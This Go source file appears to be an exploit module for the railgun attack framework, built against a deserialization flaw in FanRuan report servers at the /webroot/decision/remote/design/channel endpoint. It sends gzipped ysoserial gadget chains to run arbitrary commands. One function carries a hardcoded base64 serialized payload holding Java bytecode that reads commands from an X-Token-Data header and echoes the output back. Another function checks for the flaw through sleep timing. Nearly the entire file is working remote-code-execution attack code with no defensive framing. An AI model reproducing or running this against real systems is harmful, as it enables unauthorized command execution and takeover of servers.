package exp_fanruan

import (
	"encoding/base64"
	"github.com/lz520520/railgunlib/pkg/gadgets"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/code_invoke"
	"github.com/lz520520/railgunlib/pkg/templates/code_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
	"time"
)

type Exp_channel struct {
	exp_templates.ExpTemplate
}

// #####################编码转换模块生成#########################
func GzipEncode(src string) (dst string, err error) {
	codeParams := []code_model.CodeParams{

		{
			CodeType: "char",
			CodeName: "Gzip",
			CodeMode: "Encode",
			CodeOptions: []code_model.CodeOption{

				{
					KeyName: "level",
					Value:   "DefaultCompression",
				},
			},
		},
	}
	return code_invoke.CodeInvoke(src, codeParams)
}

// #####################编码转换模块生成#########################

// #####################编码转换模块生成#########################
func LanguageEncode(src string) (dst string, err error) {
	codeParams := []code_model.CodeParams{

		{
			CodeType: "char",
			CodeName: "Language",
			CodeMode: "Encode",
			CodeOptions: []code_model.CodeOption{

				{
					KeyName: "dst Charset",
					Value:   "UTF-8",
				},

				{
					KeyName: "src Charset",
					Value:   "GBK",
				},
			},
		},
	}
	return code_invoke.CodeInvoke(src, codeParams)
}

// #####################编码转换模块生成#########################

func (self *Exp_channel) Attack_check() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()
	payload := string(gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), cmd))
	headers.Set("Content-Type", "multipart/form-data")
	payload, _ = GzipEncode(payload)
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/webroot/decision/remote/design/channel"), payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	expResult.Status = true
	self.EchoInfoMsg("无回显，自行检查")
	return
}

func (self *Exp_channel) Attack_echocmd() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")

	headers := self.GetInitExpHeaders()
	headers.Set("Content-Type", "multipart/form-data")
	if self.MustGetStringParam("gadget") == "CommonsBeanutilsNoCC2TomcatEcho" {
		yso, _ := base64.StdEncoding.DecodeString("rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAAAAAAAdXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAD/rK/rq+AAAAMQDjAQA1b3JnL2FwYWNoZS9tYXZlbi9lbGVtZW50L2ZhY2VsZXRzL0ZhY2VsZXRDb252ZXJ0ZXJUYWcHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQwABQAGCgAEAAkBAAFxAQAzKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAHZXhlY0NtZAwADQAMCgACAA4BAAg8Y2xpbml0PgEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcAEQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HABMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAVAQAVamF2YS9sYW5nL1RocmVhZEdyb3VwBwAXAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwAZAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHABsBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwAdAQAQamF2YS9sYW5nL1RocmVhZAcAHwEAEGphdmEvbGFuZy9TdHJpbmcHACEBAA5qYXZhL3V0aWwvTGlzdAcAIwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwAlAQANU3RhY2tNYXBUYWJsZQEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAKAApCgAgACoBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMACwALQoAIAAuAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAMAAxCgAgADIBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMADQANQoABAA2AQAHdGhyZWFkcwgAOAEAD2phdmEvbGFuZy9DbGFzcwcAOgEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMADwAPQoAOwA+AQANc2V0QWNjZXNzaWJsZQEABChaKVYMAEAAQQoAHABCAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAEQARQoAHABGAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABIAEkKACAASgEABGV4ZWMIAEwBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwATgBPCgAiAFABAARodHRwCABSAQAGdGFyZ2V0CABUAQASamF2YS9sYW5nL1J1bm5hYmxlBwBWAQAGdGhpcyQwCABYAQAHaGFuZGxlcggAWgEADWdldFN1cGVyY2xhc3MMAFwANQoAOwBdAQAGZ2xvYmFsCABfAQAKcHJvY2Vzc29ycwgAYQEABHNpemUBAAMoKUkMAGMAZAsAJABlAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABEAGcLACQAaAEAA3JlcQgAagEAC2dldFJlc3BvbnNlCABsAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAbgBvCgA7AHABABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAHIBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAHQAdQoAcwB2AQAJZ2V0SGVhZGVyCAB4AQAKQ01EX0hFQURFUgEAEkxqYXZhL2xhbmcvU3RyaW5nOwwAegB7CQACAHwBAAdpc0VtcHR5AQADKClaDAB+AH8KACIAgAEACXNldFN0YXR1cwgAggEAEWphdmEvbGFuZy9JbnRlZ2VyBwCEAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DACGAIcJAIUAiAEABChJKVYMAAUAigoAhQCLDAALAAwKAAIAjQEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawgAjwEAB2Zvck5hbWUBAD0oTGphdmEvbGFuZy9TdHJpbmc7WkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7DACRAJIKADsAkwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsMAJUAlgoAOwCXAQAIc2V0Qnl0ZXMIAJkBAAJbQgcAmwEAEWdldERlY2xhcmVkTWV0aG9kDACdAG8KADsAngEAC3RvQnl0ZUFycmF5AQAEKClbQgwAoAChCgAmAKIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwApAClCgCFAKYBAAdkb1dyaXRlCACoAQATamF2YS5uaW8uQnl0ZUJ1ZmZlcggAqgEABHdyYXAIAKwBABNbTGphdmEvbGFuZy9TdHJpbmc7BwCuAQATamF2YS9pby9JbnB1dFN0cmVhbQcAsAEAB29zLm5hbWUIALIBABBqYXZhL2xhbmcvU3lzdGVtBwC0AQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3Ry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")
		payload, _ := GzipEncode(string(yso))
		headers.Set("X-Token-Data", cmd)
		httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/webroot/decision/remote/design/channel"), payload, headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		expResult.Status = true

		result := strings.Split(httpresp.Body, "\u001F")
		test, _ := LanguageEncode(result[0])
		self.EchoInfoMsg(test)

	} else {
		self.AddEncodeCmdHeader(headers, cmd)
		payload := string(gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), cmd))
		payload, _ = GzipEncode(payload)
		httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/webroot/decision/remote/design/channel"), payload, headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		self.EchoDebugMsg(httpresp.Resp.Header.Get("Transfer-encoded"))

		if self.CheckRespHeader(httpresp.Resp.Header) {
			expResult.Status = true
			// 解码响应数据
			result, err := self.ParserEncodeCmdResult(httpresp.Body)
			if err != nil {
				expResult.Err = err.Error()
				return
			}
			self.EchoInfoMsg(result)
		} else {
			self.EchoErrMsg("利用失败")
		}
	}
	return
}

func (self *Exp_channel) subSleep() (err error) {
	headers := self.GetInitExpHeaders()
	payload := string(gadgets.YsoserialPayloadGenerator(self.MustGetStringParam("gadget"), ""))
	headers.Set("Content-Type", "multipart/form-data")
	payload, _ = GzipEncode(payload)
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/webroot/decision/remote/design/channel"), payload, headers)
	if httpresp.Err != nil {
		err = httpresp.Err
		return
	}
	return
}

func (self *Exp_channel) Attack_sleep() (expResult exp_model.ExpResult) {
	expResult.Status, _ = self.CheckGagdetWithSleep(self.subSleep, 10*time.Second)
	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_channel{}, "exp_channel.yml")

}
